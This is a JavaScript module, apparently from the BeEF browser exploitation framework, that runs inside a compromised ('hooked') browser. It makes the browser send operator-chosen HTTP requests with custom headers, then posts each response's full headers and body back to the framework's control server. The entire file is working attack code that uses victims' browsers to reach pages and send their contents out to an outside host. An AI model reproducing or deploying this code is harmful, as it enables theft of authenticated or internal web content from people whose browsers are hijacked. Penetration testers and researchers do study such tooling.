/*!
 * @literal object: beef.net.requester
 * 
 * request object structure:
 * + method: {String} HTTP method to use (GET or POST).
 * + host: {String} hostname
 * + query_string: {String} The query string is a part of the URL which is passed to the program.
 * + uri: {String} The URI syntax consists of a URI scheme name.
 * + headers: {Array} contain the operating parameters of the HTTP request. 
 */
beef.net.requester = {
	
	handler: "requester",
	
	send: function(requests_array) {
		var http = beef.net.get_ajax();
		
		for(i in requests_array) {
			request = requests_array[i];
			
			// initializing the connection
			http.open(request.method, request.uri, true);
			
			// setting the HTTP headers
			for(index in request.headers) {
				http.setRequestHeader(index, request.headers[index]);
			}
			
			http.onreadystatechange = function() {
				if (http.readyState == 4) {
					headers = http.getAllResponseHeaders();
					body = http.responseText;
					
					// sending the results back to the framework
					beef.net.request(
						beef.net.beef_url+'/'+beef.net.requester.handler,
						'POST',
						null,
						"id="+request.id+"&body="+escape(headers+"\n\n"+body)
					);
				}
			}
			
			if(request.method == 'POST' && request.params) {
				http.send(request.params);
			} else {
				http.send(null);
			}
		}
	}
	
};

beef.regCmp('beef.net.requester');